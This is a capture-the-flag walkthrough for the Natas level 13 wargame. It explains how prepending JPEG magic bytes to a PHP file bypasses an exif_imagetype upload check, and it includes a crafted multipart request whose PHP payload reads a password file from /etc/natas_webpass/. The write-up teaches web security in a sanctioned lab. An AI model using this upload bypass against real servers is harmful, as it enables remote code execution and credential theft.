```
.%%..%%...%%%%...%%%%%%...%%%%....%%%%...........%%......%%%%%%..%%..%%..%%%%%%..%%..............%%........%%.
.%%%.%%..%%..%%....%%....%%..%%..%%..............%%......%%......%%..%%..%%......%%.............%%%....%%..%%.
.%%.%%%..%%%%%%....%%....%%%%%%...%%%%...........%%......%%%%....%%..%%..%%%%....%%..............%%....%%%%%%.
.%%..%%..%%..%%....%%....%%..%%......%%..........%%......%%.......%%%%...%%......%%..............%%........%%.
.%%..%%..%%..%%....%%....%%..%%...%%%%...........%%%%%%..%%%%%%....%%....%%%%%%..%%%%%%........%%%%%%......%%.
..............................................................................................................
```
Find the password for the user *natas14* to log in at
`http://natas14.natas.labs.overthewire.org` for the next level. [^1]

Solution
-----------------------------------------------------------------------------------------
The developers fixed the last bug of accepting all kinds of file types at server side.
Now, they claim to accept only image files and in the source code we are here to verify
that. Here, the else if block `exif_imagetype($_FILES['uploadedfile']['tmp_name'])`
checks if the uploaded file indeed is an image. However, we know that there is a trick to
make `exif_imagetype` believe that an image file was uploaded, when in reality a script
was uploaded. And that is by changing the *magic bytes* in the beginning of a file to
something else. In a list of file signatures [^2], we can discover the first four bytes
that determine how `exif_imagetype` sees a file. And since we want a *jpeg* file, we
search for the term and discover the hex signature "FF D8 FF E0" for a JPG. Now, we begin
by crafting a malicious file `show_password_file.php` and add the same script from the
last level to it with our first four bytes at the beginning with a space, to avoid
overwriting the actual code, for example
`....<?php echo file_get_contents("/etc/natas_webpass/natas13")?>`. Since, we are using
`vi`, we can then move to the hex view with `:%!xxd` and change the first four bytes
to the magic code from earlier "FF D8 FF E0" and revert back to normal mode with
`:%!xxd -r`. Now we have our payload for a file injection attack but note, that we can
not directly upload the PHP file again due to the client-side protection. Instead we
want to upload a sample image again, modify the request and resend it again. In the body
of the new request, we modify the file contents as follows.
```
------geckoformboundary44d575ba5d36b738b8512041f8e9260
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
------geckoformboundary44d575ba5d36b738b8512041f8e9260
Content-Disposition: form-data; name="filename"

letmein.php
------geckoformboundary44d575ba5d36b738b8512041f8e9260
Content-Disposition: form-data; name="uploadedfile"; filename="linux_resized.jpg"
Content-Type: image/jpeg

ÿØÿà<?php echo file_get_contents("/etc/natas_webpass/natas14")?>
------geckoformboundary44d575ba5d36b738b8512041f8e9260--
```
This lets us upload the malicious PHP code which can be invoked by viewing the uploaded
file `upload/mzhgfmg6w8.php`.

[^1]: https://overthewire.org/wargames/natas/natas14.html
[^2]: https://en.wikipedia.org/wiki/List_of_file_signatures
